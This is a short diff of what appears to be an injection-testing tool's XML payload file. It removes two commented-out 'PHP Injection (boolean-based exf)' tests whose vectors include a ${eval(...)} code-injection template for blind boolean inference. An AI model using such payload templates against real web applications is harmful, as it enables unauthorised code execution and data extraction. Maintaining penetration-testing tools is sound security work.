@@ -154,47 +154,7 @@ Tag: <test>
 -->
 
 <root>
-<!--
-    <test>
-        <title>PHP Injection (boolean-based exf)</title>
-        <stype>1</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>if([INFERENCE]){echo "===============================";}else{die();}</vector>
-        <request>
-            <payload>if([RANDNUM] == [RANDNUM]){echo "===============================";}else{die();}</payload>
-            <comment></comment>
-        </request>
-        <response>
-            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
-        </response>
-        <details>
-            <dbms>PHP</dbms>
-        </details>
-    </test>
 
-    <test>
-        <title>PHP Injection (boolean-based exf)</title>
-        <stype>1</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>${eval("if([INFERENCE]){echo str_repeat(\"-=\",100);}else{echo str_repeat(\"+\",1);}")}</vector>
-        <request>
-            <payload>${eval("if([RANDNUM] == [RANDNUM]){echo str_repeat(\"-=\",100);}else{echo str_repeat(\"+\",1);}")}</payload>
-            <comment></comment>
-        </request>
-        <response>
-            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
-        </response>
-        <details>
-            <dbms>PHP</dbms>
-        </details>
-    </test>
-    -->
     <!-- Boolean-based blind tests - WHERE/HAVING clause -->
     <test>
         <title>AND boolean-based blind - WHERE or HAVING clause</title>
